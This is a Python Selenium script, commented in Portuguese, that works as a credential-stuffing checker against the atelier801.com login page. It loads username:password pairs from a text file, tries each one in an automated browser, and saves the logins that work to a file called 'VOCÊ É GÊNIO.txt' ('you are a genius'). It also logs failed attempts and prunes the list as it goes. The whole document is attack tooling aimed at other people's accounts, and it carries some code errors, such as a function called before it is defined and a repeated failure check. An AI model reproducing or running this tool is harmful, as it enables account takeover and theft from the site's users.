import multiprocessing as mp
import selenium
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
import numpy as np
import random

# Selenium Settings
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
service = webdriver.chrome.service.Service(executable_path='chromedriver.exe')

# Define a função que cada processo executará
def process_func(accounts):
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_window_size(1280, 768)
    # driver.minimize_window()
    accounts_list = accounts.tolist()
    for account in accounts:
        Checker(driver, account[0], account[1])
        accounts_list = accounts_list[1:] # Remover o primeiro elemento da lista de contas
        with open('Lista de contas.txt', 'w') as f:
            f.write('\n'.join([f'{acc[0]}:{acc[1]}' for acc in accounts])) # Reescrever a lista no arquivo
    driver.quit()

# Inicia a criação de processos
if __name__ == '__main__':
    # Divide a lista de contas em 5 partes iguais
    accounts = []
    with open('Lista de contas.txt', 'r') as f:
        for line in f.readlines():
            accounts.append(line.strip().split(':'))
    splitted_accounts = np.array_split(accounts, 1)

    # Cria e inicia os processos
    processes = []
    for i in range(1):
        p = mp.Process(target=process_func, args=(splitted_accounts[i],))
        processes.append(p)
        p.start()

    # Espera todos os processos terminarem
    for p in processes:
        p.join()

# Função para salvar contas com login bem-sucedido
def save_account(username, password):
    with open('VOCÊ É GÊNIO.txt', 'a') as f:
        f.write(f'{username}:{password}\n')

# Função Checker
def Checker(driver, username, password):
    try:
        driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Carrega o site

        try:
            WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="auth_login_1"]')))
            driver.find_element(By.XPATH, '//*[@id="auth_login_1"]') \
                .send_keys(username) #Insira o nome de usuário

            WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="auth_pass_1"]')))
            driver.find_element(By.XPATH, '//*[@id="auth_pass_1"]') \
                .send_keys(password) #Insira a senha

            WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="rester_connecte_1"]')))
            driver.find_element(By.XPATH, '//*[@id="rester_connecte_1"]') \
                .click() #CLique para manter conectado

            WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="corps"]/div[3]/div/form[1]/fieldset/div[4]/button')))
            driver.find_element(By.XPATH, '//*[@id="corps"]/div[3]/div/form[1]/fieldset/div[4]/button') \
                .click() #Clique para logar

            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//div[contains(@class, "modal-body") and contains(text(), "Login ou senha inválidos")]')))
            print(f"Senha incorreta chefe :( {username}:{password}")
            with open('ja foram testadas.txt', 'a') as f:
                f.write(f'{username}:{password}\n')

            access = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div/ul[2]/li[2]/form/button'))) \
                .text #Copy the text, to see if the login informations are good.

            if driver.current_url == "https://atelier801.com/index": 
                print(f"Login bem-sucedido para {username}:{password}")
                save_account(username, password)
                try:
                    disconnect_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="formulaire_deconnexion"]/button')))
                    disconnect_button.click()
                    print("Conta desconectada com sucesso.")
                except:
                    print("Não foi possível desconectar a conta.")

                # Remove a conta testada da lista de contas
                with open('Lista de contas.txt', 'r+') as f:
                    lines = f.readlines()
                    f.seek(0)
                    for line in lines:
                        if not line.startswith(f'{username}:{password}'):
                            f.write(line)
                    f.truncate()

            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//div[contains(@class, "modal-body") and contains(text(), "Login ou senha inválidos")]')))
            print(f"Senha incorreta chefe :( {username}:{password}")
            with open('ja foram testadas.txt', 'a') as f:
                f.write(f'{username}:{password}\n')

        except NoSuchElementException:
            print(f"Erro: elementos não encontrados para {username}:{password}")
    except TimeoutException:
        print(f"Erro: tempo esgotado {username}:{password}")
        with open('ja foram testadas.txt', 'a') as f:
            f.write(f'{username}:{password}\n')